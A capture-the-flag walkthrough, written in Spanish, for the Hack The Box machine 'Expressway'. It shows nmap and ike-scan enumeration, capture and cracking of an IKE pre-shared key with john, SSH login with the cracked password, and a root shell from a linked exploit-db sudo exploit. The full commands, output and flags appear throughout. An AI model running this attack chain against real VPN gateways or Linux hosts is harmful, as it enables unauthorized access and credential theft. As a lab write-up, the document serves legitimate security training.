# HTB: Expressway - Internet Security Association and Key Management Protocol

## Host: Linux
## IP: 10.10.11.87

## Procedimiento y comandos
#### Paso 1: Enumeracion

* ** Nmap**

TCP:

```bash
 nmap -A -vv -p- -T4 -Pn -oX expressway.scan 10.10.11.87 --webxml
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 16:57 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:57
Completed NSE at 16:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:57
Completed NSE at 16:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:57
Completed NSE at 16:57, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:57
Completed Parallel DNS resolution of 1 host. at 16:57, 0.02s elapsed
Initiating SYN Stealth Scan at 16:57
Scanning 10.10.11.87 [65535 ports]
Discovered open port 22/tcp on 10.10.11.87
Increasing send delay for 10.10.11.87 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.87 from 5 to 10 due to max_successful_tryno increase to 6
Warning: 10.10.11.87 giving up on port because retransmission cap hit (6).
SYN Stealth Scan Timing: About 20.66% done; ETC: 17:00 (0:01:59 remaining)
SYN Stealth Scan Timing: About 23.16% done; ETC: 17:02 (0:03:22 remaining)
SYN Stealth Scan Timing: About 26.52% done; ETC: 17:03 (0:04:12 remaining)
SYN Stealth Scan Timing: About 30.77% done; ETC: 17:04 (0:04:32 remaining)
SYN Stealth Scan Timing: About 36.42% done; ETC: 17:05 (0:04:55 remaining)
SYN Stealth Scan Timing: About 50.48% done; ETC: 17:06 (0:04:32 remaining)
SYN Stealth Scan Timing: About 59.82% done; ETC: 17:07 (0:04:04 remaining)
SYN Stealth Scan Timing: About 67.00% done; ETC: 17:08 (0:03:32 remaining)
SYN Stealth Scan Timing: About 73.13% done; ETC: 17:08 (0:02:58 remaining)
SYN Stealth Scan Timing: About 78.96% done; ETC: 17:08 (0:02:23 remaining)
SYN Stealth Scan Timing: About 84.48% done; ETC: 17:09 (0:01:46 remaining)
SYN Stealth Scan Timing: About 89.62% done; ETC: 17:09 (0:01:11 remaining)
SYN Stealth Scan Timing: About 95.11% done; ETC: 17:09 (0:00:34 remaining)
Completed SYN Stealth Scan at 17:09, 711.77s elapsed (65535 total ports)
Initiating Service scan at 17:09
Scanning 1 service on 10.10.11.87
Completed Service scan at 17:09, 0.53s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.11.87
Retrying OS detection (try #2) against 10.10.11.87
Retrying OS detection (try #3) against 10.10.11.87
Retrying OS detection (try #4) against 10.10.11.87
Retrying OS detection (try #5) against 10.10.11.87
Initiating Traceroute at 17:09
Completed Traceroute at 17:09, 1.25s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 17:09
Completed Parallel DNS resolution of 2 hosts. at 17:09, 0.02s elapsed
NSE: Script scanning 10.10.11.87.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:09
Completed NSE at 17:09, 6.76s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:09
Completed NSE at 17:09, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:09
Completed NSE at 17:09, 0.00s elapsed
Nmap scan report for 10.10.11.87
Host is up, received user-set (0.24s latency).
Scanned at 2025-09-26 16:57:39 -03 for 737s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
23980/tcp filtered unknown no-response
44609/tcp filtered unknown no-response
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/26%OT=22%CT=1%CU=40088%PV=Y%DS=2%DC=T%G=Y%TM=68D6F31
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=106%TI=Z%TS=1)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%
OS:TS=A)SEQ(SP=109%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=10A%GCD=1%ISR=1
OS:0B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW9%O2=M552ST11NW9%O3=M552NNT11NW9
OS:%O4=M552ST11NW9%O5=M552ST11NW9%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W
OS:4=FE88%W5=FE88%W6=FE88)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW9%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
OS:R=N)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
OS:=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.000 days (since Fri Sep 26 17:09:45 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   235.18 ms 10.10.14.1
2   235.39 ms 10.10.11.87

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:09
Completed NSE at 17:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:09
Completed NSE at 17:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:09
Completed NSE at 17:09, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 738.30 seconds
           Raw packets sent: 71110 (3.135MB) | Rcvd: 68413 (2.741MB)
```

UDP:

```bash
nmap -sU -p 53,67,69,123,137,161,500,514,1812,1900 10.10.11.87  -v                                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 17:23 -03
Initiating Ping Scan at 17:23
Scanning 10.10.11.87 [4 ports]
Completed Ping Scan at 17:23, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:23
Completed Parallel DNS resolution of 1 host. at 17:23, 0.02s elapsed
Initiating UDP Scan at 17:23
Scanning 10.10.11.87 [10 ports]
Discovered open port 500/udp on 10.10.11.87
Completed UDP Scan at 17:23, 7.27s elapsed (10 total ports)
Nmap scan report for 10.10.11.87
Host is up (0.31s latency).

PORT     STATE         SERVICE
53/udp   closed        domain
67/udp   closed        dhcps
69/udp   open|filtered tftp
123/udp  closed        ntp
137/udp  closed        netbios-ns
161/udp  closed        snmp
500/udp  open          isakmp
514/udp  closed        syslog
1812/udp closed        radius
1900/udp closed        upnp

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.71 seconds
           Raw packets sent: 48 (3.926KB) | Rcvd: 20 (1.916KB)
```

```bash
nmap -sU -p 500 -sV -sC 10.10.11.87                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 17:24 -03
Nmap scan report for 10.10.11.87
Host is up (0.28s latency).

PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.45 seconds
```
**Internet Security Association and Key Management Protocol**

* **Searchsploit**

```bash
searchsploit "isakmp" 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
IPsec-Tools < 0.7.2 (racoon frag-isakmp) - Multiple Remote Denial of Service Vulnerabilities (PoC)                                                                                                        | multiple/dos/8669.c
OpenBSD 3.x - ISAKMPD Security Association Piggyback Delete Payload Denial of Service                                                                                                                     | openbsd/dos/24181.sh
tcpdump - ISAKMP Identification Payload Integer Overflow                                                                                                                                                  | linux/remote/171.c
TCPDump 3.x - Malformed ISAKMP Packet Denial of Service                                                                                                                                                   | linux/dos/22294.c
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

[Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html)

* **ike-scan**

```bash
ike-scan -M 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=6ff61060f5d37eca)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.304 seconds (3.29 hosts/sec).  1 returned handshake; 0 returned notify
```
_"1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output)."_

```bash
ike-scan -M --showbackof 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=f91e4b0aa99c02b0)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

IKE Backoff Patterns:

IP Address      No.     Recv time               Delta Time
10.10.11.87     1       1758921665.980100       0.000000
10.10.11.87     Implementation guess: Linksys Etherfast

Ending ike-scan 1.9.6: 1 hosts scanned in 60.447 seconds (0.02 hosts/sec).  1 returned handshake; 0 returned notify

```

```bash
 ike-scan -P -M -A -n fakeID 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=5c222112e1c212c3)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
f94aa853242b32a2b2dfb72545f8f5c2ba138f4c1091be74d40f7e0c585103bce5b6e247237c3132c212375a985fa980319aa48337abc060743c709d537b37b679f37ed21fa7f0203310bed7bad433a37b8b0678e3ff1c2a8acd87f44526f3a132f56ca213749f62233f7cfc1027f9f04b0bea2f7ebf24e9883232ccce06df88:62bc2a456df0643de885c50948e9bc60824669f82eb59a6b17775297ccc51b724ace7df8b898e83b23e34ffb96dfdc2dad765fd63983d5939373e570f94570c8debd3900e30d0cd52eb4104babcb3f0a49e80813d6cf66749cac9729264431126a4f886aba0e2cd07efbf4c43c6e9d5ffe3678a359542d7573e484f2afac0a5b:5c222112e1c212c3:5d37b29288179a9c:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:f12327db02d66dd330f7b482345163bb7af9375b:e17fe67649d8e89c6e6f9f08dec7504cbb2e84d494cdfbcd10e11695d2892dcd:b90745a2a9b51701ca71439671e1fd2622835302
Ending ike-scan 1.9.6: 1 hosts scanned in 0.274 seconds (3.65 hosts/sec).  1 returned handshake; 0 returned notify
```
Obtuvimos un nomre de usuario y un hash. Volvemos a ejecutar el comando pero esta vez con la opcion para capturar el hash

```bash
ike-scan -P -M -A -n fakeID --pskcrack=hash.txt  10.10.11.87                                                                                                                          
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=6948b598dbaadc4e)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.328 seconds (3.05 hosts/sec).  1 returned handshake; 0 returned notify
```

Con el hash capturado lo utilizamos con john:

```bash
ikescan2john hash.txt > hash.hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash 
Warning! john.conf section [list.rules:sshrules] is multiple declared.
Using default input encoding: UTF-8
Loaded 1 password hash (IKE, PSK [HMAC MD5/SHA1 32/64])
Cost 1 (hash algorithm used for hmac [1:MD5 2:SHA1]) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
freakingrockstarontheroad (?)     
1g 0:00:00:05 DONE (2025-09-26 19:07) 0.1915g/s 1541Kp/s 1541Kc/s 1541KC/s frecuencia.666..frazel03
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Con un usuario y password podemos intentar acceder por ssh:

User: ike@explressway.htb
Pass: freakingrockstarontheroad

#### Paso 2: Acceso inicial

```bash
 ssh ike@expressway.htb
The authenticity of host 'expressway.htb (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'expressway.htb' (ED25519) to the list of known hosts.
ike@expressway.htb's password: 
Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 26 23:12:44 2025 from 10.10.14.22
ike@expressway:~$ 
```

Obtenemos el flag:

```bash
ike@expressway:~$ ls -la
total 32
drwx------ 4 ike  ike  4096 Sep 16 10:23 .
drwxr-xr-x 3 root root 4096 Aug 14 22:48 ..
lrwxrwxrwx 1 root root    9 Aug 29 14:57 .bash_history -> /dev/null
-rw-r--r-- 1 ike  ike   220 May 18 22:58 .bash_logout
-rw-r--r-- 1 ike  ike  3526 Aug 28 12:49 .bashrc
drwxr-xr-x 3 ike  ike  4096 Aug 28 12:29 .local
-rw-r--r-- 1 ike  ike   807 May 18 22:58 .profile
drwx------ 2 ike  ike  4096 Sep 16 10:21 .ssh
-rw-r----- 1 root ike    33 Sep 26 22:14 user.txt
ike@expressway:~$ cat user.txt
d7b121505f47f013b1dca16819ed0cde
ike@expressway:~$ 
```

#### Escalada de privilegios

* Enumeracion:

```bash
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Usamos este [exploit](https://www.exploit-db.com/exploits/52352)

```bash
ike@expressway:~$ ./exploit.sh
[*] Running exploit…
root@expressway:/# whoami
root
root@expressway:/root# cat root.txt
60e379bcc60fce93ffdfe94fbc3f9b9d
root@expressway:/root# 
```

